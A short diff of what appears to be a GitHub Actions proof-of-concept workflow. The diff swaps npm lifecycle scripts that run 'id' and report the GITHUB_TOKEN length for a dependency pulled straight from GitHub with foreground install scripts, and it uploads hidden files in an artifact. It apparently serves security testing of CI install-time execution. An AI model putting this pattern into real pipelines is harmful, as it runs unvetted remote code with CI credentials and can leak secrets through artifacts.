@@ -16,13 +16,14 @@ jobs:
             "name": "poc-root",
             "version": "1.0.0",
             "private": true,
-            "scripts": {
-              "prepare": "echo PREPARE_EXECUTED; id; echo TOKEN_LEN=${#GITHUB_TOKEN}",
-              "postinstall": "echo POSTINSTALL_EXECUTED"
+            "dependencies": {
+              "gab-poc-npm-dep": "github:PDFtoMark/gab-poc-npm-dep"
             }
           }
           PKG
+          printf 'foreground-scripts=true\n' > poc/.npmrc
       - uses: actions/upload-artifact@v7
         with:
           name: linter-report
-          path: poc/*
+          path: poc/**/*
+          include-hidden-files: true
